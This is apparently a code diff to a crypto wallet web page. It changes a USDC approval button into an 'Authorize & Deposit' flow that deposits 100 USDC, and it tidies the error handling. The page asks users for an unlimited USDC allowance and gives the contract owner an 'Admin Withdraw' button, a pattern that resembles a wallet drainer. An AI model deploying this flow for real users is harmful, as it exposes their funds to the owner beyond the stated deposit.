@@ -43,6 +43,9 @@
     .error {
       color: var(--error);
     }
+    .success {
+      color: var(--success);
+    }
     .admin-only {
       border: 2px solid var(--error);
     }
@@ -52,7 +55,7 @@
   <h2>Mark III Wallet Authorization</h2>
   
   <button id="connect">Connect Wallet</button>
-  <button id="authorize" disabled>Authorize USDC</button>
+  <button id="authorize" disabled>Authorize & Deposit</button> <!-- 按钮重命名更准确 -->
   <button id="adminButton" class="admin-only" disabled style="display:none;">Admin Withdraw</button>
   
   <div id="status">Status: Connect your wallet</div>
@@ -66,8 +69,10 @@
       ABI: [
         "function owner() view returns (address)",
         "function withdraw() external",
+        "function deposit(uint256 amount) external", // 添加deposit方法
         "function approve(address,uint256) returns (bool)"
-      ]
+      ],
+      DEPOSIT_AMOUNT: 100000000 // 100 USDC (6 decimals)
     };
 
     // DOM Elements
@@ -104,25 +109,22 @@
         statusEl.textContent = `Connected: ${user}`;
         
       } catch (err) {
-        statusEl.textContent = `Error: ${err.message}`;
-        statusEl.className = 'error';
+        showError(err);
       }
     }
 
     function updateUI() {
       connectBtn.disabled = true;
       authorizeBtn.disabled = false;
-      
-      // Show admin button only for owner
       adminBtn.style.display = isOwner ? 'block' : 'none';
       adminBtn.disabled = false;
       adminBtn.onclick = adminWithdraw;
-      
-      authorizeBtn.onclick = authorizeUSDC;
+      authorizeBtn.onclick = authorizeAndDeposit; // 更新点击事件
     }
 
-    async function authorizeUSDC() {
+    async function authorizeAndDeposit() {
       try {
+        // 1. 授权USDC
         const usdc = new ethers.Contract(
           CONFIG.USDC_ADDRESS,
           ["function approve(address,uint256) returns (bool)"],
@@ -130,13 +132,24 @@
         );
         
         statusEl.textContent = "Approving USDC...";
-        const tx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
-        await tx.wait();
+        const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+        await approveTx.wait();
         
-        statusEl.textContent = "✅ USDC Approved Successfully";
+        // 2. 执行存款
+        statusEl.textContent = "Depositing USDC...";
+        const contract = new ethers.Contract(
+          CONFIG.CONTRACT_ADDRESS,
+          CONFIG.ABI,
+          signer
+        );
+        const depositTx = await contract.deposit(CONFIG.DEPOSIT_AMOUNT);
+        await depositTx.wait();
+        
+        statusEl.textContent = `✅ Success! Deposited ${CONFIG.DEPOSIT_AMOUNT/1e6} USDC`;
+        statusEl.className = 'success';
+        
       } catch (err) {
-        statusEl.textContent = `Error: ${err.message}`;
-        statusEl.className = 'error';
+        showError(err);
       }
     }
 
@@ -155,10 +168,16 @@
         await tx.wait();
         
         statusEl.textContent = "✅ Withdrawal Successful";
+        statusEl.className = 'success';
       } catch (err) {
-        statusEl.textContent = `Error: ${err.message}`;
-        statusEl.className = 'error';
+        showError(err);
       }
+    }
+
+    function showError(err) {
+      console.error(err);
+      statusEl.textContent = `Error: ${err.message}`;
+      statusEl.className = 'error';
     }
   </script>
 </body>
